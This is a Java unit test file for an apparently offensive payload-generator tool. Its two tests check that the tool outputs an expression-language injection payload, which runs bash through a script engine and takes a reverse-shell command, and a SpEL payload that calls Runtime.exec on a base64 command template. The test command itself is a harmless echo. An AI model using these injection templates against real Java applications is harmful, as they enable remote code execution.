package generators;

import org.junit.Test;

import static org.junit.Assert.assertEquals;

public class ContextExecGenerator_ArrowTest {

    @Test
    public void getEvilELCodeFormatsReverseShellCommand() {
        ContextExecGenerator generator = new ContextExecGenerator(null);
        generator.execCode = new ExecCodeGenerator(null);
        generator.execCode.reverseShellCommand = "echo test";

        String expected = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['bash','-c','echo test']).start()\")";
        assertEquals(expected, generator.getEvilELCode());
    }

    @Test
    public void getEvilSpelCodeFormatsBase64CommandTemplate() {
        ContextExecGenerator generator = new ContextExecGenerator(null);
        generator.execCode = new ExecCodeGenerator(null);

        String expected = String.format("T(java.lang.Runtime).getRuntime().exec('%s')", generator.execCode.getBase64CommandTpl());
        assertEquals(expected, generator.getEvilSpelCode());
    }
}
